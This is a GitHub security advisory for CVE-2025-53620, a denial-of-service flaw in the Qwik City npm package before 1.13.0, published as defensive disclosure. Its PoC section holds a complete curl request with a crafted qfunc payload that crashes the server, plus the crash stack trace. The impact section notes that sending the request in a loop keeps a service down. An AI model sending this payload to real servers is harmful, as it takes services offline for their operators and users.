# [C] Qwik's unhandled exception vulnerabilty can cause server crashes from malicious requests

## Summary
Severity: Critical
Advisory: GHSA-qr9h-j6xg-2j72
CVE: CVE-2025-53620
CWE: CWE-248
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H (CVSS_V4)
Published: 2025-07-09
Source: https://github.com/advisories/GHSA-qr9h-j6xg-2j72
Type: github-advisory

## Affected
- npm: `@builder.io/qwik-city` — affected >=0 <1.13.0

## Details
### Summary

Possibility to craft a request that will crash the Qwik Server in the default configuration.

### Details

When a Qwik Server Action QRL is executed it dynamically load the file containing the symbol. When an invalid qfunc is sent, the server does not handle the thrown error. The error then causes Node JS to exit.

### PoC

 1. Setup a Qwik Project `pnpm create qwik@latest`
 2. Start the Qwik Server using `pnpm run preview`
 3. Execute the following curl command to crash the instance
```bash
curl --location 'http://localhost:4173/?qfunc=PPXYallGsCE' \
--header 'Content-Type: application/qwik-json' \
--header 'X-Qrl: PPXYallGsCE' \
--data '{"_entry":"2","_objs":["\u0002_#s_PPXYallGsCE",1,["0","1"]]}'
```

Here the `qfunc` query parameter, `X-Qrl` header and payload need to have the same qrl.

The Qwik Server will then crash with the message

```
qrl s_PPXYallGsCE failed to load Error: Dynamic require of "_.js" is not supported
    at file:///home/michele/Code/qwik/server/entry.preview.js:32:199
    at Object.importSymbol (file:///home/michele/Code/qwik/server/entry.preview.js:32:776)
    at $ (file:///home/michele/Code/qwik/server/entry.preview.js:26:3064)
    at d (file:///home/michele/Code/qwik/server/entry.preview.js:26:3274)
    at file:///home/michele/Code/qwik/server/entry.preview.js:26:3311
    at Object.a (file:///home/michele/Code/qwik/server/entry.preview.js:26:2566)
    at oc (file:///home/michele/Code/qwik/server/entry.preview.js:16:1562)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async Object.m [as next] (file:///home/michele/Code/qwik/server/entry.preview.js:15:7000)
    at async Ls (file:///home/michele/Code/qwik/server/entry.preview.js:15:5559)
node:internal/process/promises:289
            triggerUncaughtException(err, true /* fromPromise */);
            ^

Error: Dynamic require of "_.js" is not supported
    at file:///home/michele/Code/qwik/server/entry.preview.js:32:199
    at Object.importSymbol (file:///home/michele/Code/qwik/server/entry.preview.js:32:776)
    at $ (file:///home/michele/Code/qwik/server/entry.preview.js:26:3064)
    at d (file:///home/michele/Code/qwik/server/entry.preview.js:26:3274)
    at file:///home/michele/Code/qwik/server/entry.preview.js:26:3311
    at Object.a (file:///home/michele/Code/qwik/server/entry.preview.js:26:2566)
    at oc (file:///home/michele/Code/qwik/server/entry.preview.js:16:1562)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async Object.m [as next] (file:///home/michele/Code/qwik/server/entry.preview.js:15:7000)
    at async Ls (file:///home/michele/Code/qwik/server/entry.preview.js:15:5559)

Node.js v21.7.2
```


The same can also be repeated running Qwik in production using express.

 1. Setup a Qwik Project `pnpm create qwik@latest`
 2. Install the express middleware `pnpm run qwik add express`
 3. Build the qwik app using `pnpm run build`
 4. Start the server using `pnpm run serve`
 5. Execute the following curl command to crash the instance
```bash
curl --location 'http://localhost:3000/?qfunc=PPXYallGsCE' \
--header 'Content-Type: application/qwik-json' \
--header 'X-Qrl: PPXYallGsCE' \
--data '{"_entry":"2","_objs":["\u0002_#s_PPXYallGsCE",1,["0","1"]]}'
```

### Impact

Any Qwik Server instance running the default configuration can be crashed. Using a simple loop to send this HTTP request will cause permanent down time of the service as it takes a few seconds for an instance to restart.

There is also the issue that this can happen without a malicious attacker.
When a Qwik Application is deployed through a CDN and an old instance is still loaded on some Client, like through an inactive Tab. Once that user returns to the old Version and performs an action that runs a removed qfunc the server will crash.

## References
- https://github.com/QwikDev/qwik/security/advisories/GHSA-qr9h-j6xg-2j72
- https://nvd.nist.gov/vuln/detail/CVE-2025-53620
- https://github.com/QwikDev/qwik/pull/7342
- https://github.com/QwikDev/qwik
- https://github.com/QwikDev/qwik/releases/tag/%40builder.io%2Fqwik%401.13.0
